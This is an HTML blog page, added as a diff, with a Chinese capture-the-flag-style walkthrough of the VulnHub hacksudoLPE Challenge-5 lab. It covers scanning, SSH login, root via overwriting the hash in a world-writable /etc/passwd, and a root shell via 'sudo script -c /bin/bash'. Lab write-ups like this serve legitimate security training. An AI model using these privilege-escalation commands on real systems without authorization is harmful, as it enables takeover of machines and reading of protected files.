@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vulnhub靶机hacksudoLPE中Challenge-5 - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap"></noscript>
+<link rel="stylesheet" href="../assets/style.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="../assets/style.css"></noscript>
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="../tags/list.html?tag=vulnhub" class="tag tag-green">#vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="tag tag-blue">#渗透测试</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div id="navSentinel"></div>
+
+<div class="nav-sticky-wrapper" id="navWrap">
+  <div class="nav-inner">
+    <a href="../index.html">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向">逆向</a>
+    <a href="../tags/list.html?tag=调试">调试</a>
+    <a href="../tags/list.html">标签归档</a>
+  </div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2026 // 06 / 09</div>
+  <div class="post-title">vulnhub靶机hacksudoLPE中Challenge-5</div>
+  <div class="post-tags">
+    <a href="../tags/list.html?tag=vulnhub" class="post-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
+  </div>
+
+  <div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+    <nav class="post-toc">
+      <span class="post-toc-title">// 目录</span>
+      <ul>
+        <li class="toc-h4"><a href="#discovery">主机发现</a></li>
+        <li class="toc-h4"><a href="#portscan">端口扫描</a></li>
+        <li class="toc-h4"><a href="#ssh">SSH 登录</a></li>
+        <li class="toc-h4"><a href="#passwd">/etc/passwd 提权</a></li>
+        <li class="toc-h4"><a href="#script">script 提权</a></li>
+      </ul>
+    </nav>
+
+    <p>下载地址：<a href="https://download.vulnhub.com/hacksudo/hacksudoLPE.zip">https://download.vulnhub.com/hacksudo/hacksudoLPE.zip</a></p>
+
+    <p>Challenge-5 涉及两种提权方式：<strong>/etc/passwd 文件可写</strong>和<strong>script 命令提权</strong>。下面从主机发现开始逐步演示。</p>
+
+    <h4 id="discovery">主机发现</h4>
+    <p>使用 arp-scan 扫描局域网存活主机：</p>
+    <pre><code>arp-scan -l</code></pre>
+    <picture>
+      <source srcset="../assets/lp5_001.webp" type="image/webp">
+      <img loading="lazy" src="../assets/lp5_001.png" alt="主机发现">
+    </picture>
+    <p>找到目标靶机 IP 后 SSH 登录。</p>
+
+    <h4 id="portscan">端口扫描</h4>
+    <p>nmap 扫描开放端口与服务：</p>
+    <pre><code>nmap --min-rate 10000 -p- 192.168.21.147</code></pre>
+    <p>目标仅开放 22 端口（SSH），直接通过 SSH 连接。</p>
+
+    <h4 id="ssh">SSH 登录</h4>
+    <p>使用已知账户登录靶机，查看 Challenge-5 的提权提示：</p>
+    <pre><code>ssh user@192.168.21.147
+cat /home/user/Challenge-5</code></pre>
+    <p>进入目标用户后查看 sudo 权限：</p>
+    <pre><code>sudo -l</code></pre>
+
+    <h4 id="passwd">/etc/passwd 提权</h4>
+    <p>首先检查 /etc/passwd 是否可写：</p>
+    <pre><code>ls -la /etc/passwd</code></pre>
+    <picture>
+      <source srcset="../assets/lp5_002.webp" type="image/webp">
+      <img loading="lazy" src="../assets/lp5_002.png" alt="检查 passwd 权限">
+    </picture>
+    <p>发现文件权限为 <code>-rw-rw-rw-</code>，即所有用户均可写入。此时可以生成一个新的密码哈希并替换 root 用户的密码字段，或直接添加一个 uid=0 的新用户。</p>
+    <p>使用 openssl 生成密码哈希：</p>
+    <pre><code>openssl passwd -1 -salt mywiki 123456</code></pre>
+    <p>得到哈希后，直接编辑 /etc/passwd，将 root 行中的 x 替换为生成的哈希：</p>
+    <pre><code>root:$1$mywiki$xxxxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash</code></pre>
+    <picture>
+      <source srcset="../assets/lp5_003.webp" type="image/webp">
+      <img loading="lazy" src="../assets/lp5_003.png" alt="修改 passwd 提权">
+    </picture>
+    <p>保存退出后直接切换 root：</p>
+    <pre><code>su root</code></pre>
+    <p>输入密码 <code>123456</code> 即可获得 root 权限。</p>
+
+    <h4 id="script">script 提权</h4>
+    <p>Challenge-5 中 user 拥有 <code>script</code> 命令的 sudo 免密权限。script 命令用于记录终端会话，但配合 sudo 可以执行任意命令实现提权。</p>
+    <picture>
+      <source srcset="../assets/lp5_004.webp" type="image/webp">
+      <img loading="lazy" src="../assets/lp5_004.png" alt="script sudo 权限">
+    </picture>
+    <p>执行以下命令直接获取 root shell：</p>
+    <pre><code>sudo script -c /bin/bash</code></pre>
+    <p>或者使用 <code>-c</code> 参数执行任意命令读取敏感文件：</p>
+    <pre><code>sudo script -c "cat /root/flag.txt" -q</code></pre>
+    <picture>
+      <source srcset="../assets/lp5_005.webp" type="image/webp">
+      <img loading="lazy" src="../assets/lp5_005.png" alt="script 提权成功">
+    </picture>
+    <p><code>-q</code> 参数用于静默模式，不输出 script 自身的 banner 信息。</p>
+
+    <p>更多利用方式请参考 <a href="https://gtfobins.github.io/gtfobins/script/">GTFOBins / script</a>。</p>
+
+  </div>
+</div>
+
+<div class="footer">
+  <div class="brand"><span class="rei-symbol">◈</span> RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG <span class="rei-symbol">◈</span></div>
+  <div class="motto">&gt; 道可道，非常道，名可名，非常名</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG</div>
+</div>
+
+</div>
+
+<div class="theme-dock" id="themeDock">
+  <div class="theme-dock-item active" data-theme="dark">☽</div>
+  <div class="theme-dock-item" data-theme="light">☀</div>
+  <div class="theme-dock-item" data-theme="crystal">◇</div>
+  <div class="theme-dock-item" data-theme="ego">♢</div>
+  <div class="theme-dock-item" data-theme="rei">レ</div>
+</div>
+
+<div class="floating-buttons">
+  <button class="float-btn" id="themeToggle" title="切换主题" aria-label="切换主题">☽</button>
+  <button class="float-btn" id="backToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const tocLinks = document.querySelectorAll('.post-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+document.querySelectorAll('.post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'code-wrapper';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'code-header';
+
+  const info = document.createElement('span');
+  info.className = 'code-header-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'code-header-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'code-btn code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'code-btn code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+<div class="graph-sidebar" id="graphSidebar">
+  <div class="graph-title"><a href="../graph.html">// 关系图谱</a></div>
+  <div id="graphContainer"></div>
+</div><script>
+(function(){
+var gs=document.getElementById("graphSidebar"),gc=document.getElementById("graphContainer");
+if(!gs||!gc)return;
+var s=document.createElement("script");
+s.src="../assets/vis-network.min.js";
+s.onload=function(){
+  var d=document.createElement("script");
+  d.src="../assets/posts-data.js";
+  d.onload=function(){
+    var p=document.createElement("script");
+    p.textContent="const POSTS=POSTS_DATA.map(function(p){return{title:p.title,date:p.date,url:p.url.replace(\"posts/\",\"\"),excerpt:p.excerpt,tags:p.tags,primary:p.primary,secondary:p.secondary};});";
+    document.body.appendChild(p);
+    var g=document.createElement("script");
+    g.src="../assets/graph.js";
+    document.body.appendChild(g);
+  };
+  document.body.appendChild(d);
+};
+document.body.appendChild(s);
+})();
+</script>
+<script src="../assets/common.js"></script>
+
+</body>
+</html>
